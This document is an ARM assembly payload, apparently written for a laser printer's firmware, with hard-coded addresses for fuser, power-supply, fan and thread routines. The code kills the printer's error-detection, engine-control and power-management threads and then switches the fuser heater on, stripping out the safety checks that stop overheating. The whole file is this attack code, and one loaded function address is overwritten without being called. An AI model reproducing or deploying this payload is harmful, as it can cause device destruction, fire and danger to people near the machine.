.text
.equ printf, 0x05F414
.equ sleepfunc, 0x02CB634
.equ gpio_write_func, 0x2F3B7C
.equ raw_gpio_write_func, 0x02F4EF4
.equ HVPS_GPIO_ADDR, 0x1601968
.equ MAIN_FAN_GPIO_ADDR, 0x160C508
.equ engine_init_func, 0x3D4F0
.equ engine_warmup_func, 0x3D660
.equ dec_fuser_enable_power_func, 0x4696A0
.equ err_detect_thread_struct, 0x0BAF92C
.equ engine_control_thread_struct, 0x0BAF894
.equ pwrmgr_thread_struct, 0x0EB9744
.equ pwrschema_thread_struct, 0xEBDE00
.equ kill_thread_func, 0x82B78C
.equ disable_pwrmgr_func, 0x2C3C98
.equ fuser_on_func, 0x004696A0

MOV        LR,LR
    NOP
    MOV        LR,LR
    NOP


    STMFD   SP!, {R4-R12, LR}
    SUB     SP, SP, #0x40

    LDR R0, =debugStr
    LDR R12, =printf
    BLX R12

    LDR R0, =err_detect_thread_struct
    LDR R12, =kill_thread_func
    BLX R12

    LDR R0, =engine_control_thread_struct
    LDR R12, =kill_thread_func
    BLX R12

    LDR R0, =pwrschema_thread_struct
    LDR R12, =kill_thread_func
    BLX R12

    LDR R0, =pwrmgr_thread_struct
    LDR R12, =kill_thread_func
    BLX R12

    LDR R12, =disable_pwrmgr_func
    MOV R0, #0x64
    LDR R12, =fuser_on_func
    BLX R12

    
    ADD     SP, SP, #0x40
    LDMFD   SP!, {R4-R12, LR}

B _after_lit

debugStr:   .asciz "m0m: !!\n"

 .align
 .ltorg


_after_lit:

    MOV        LR,LR
    NOP
    MOV        LR,LR
    NOP
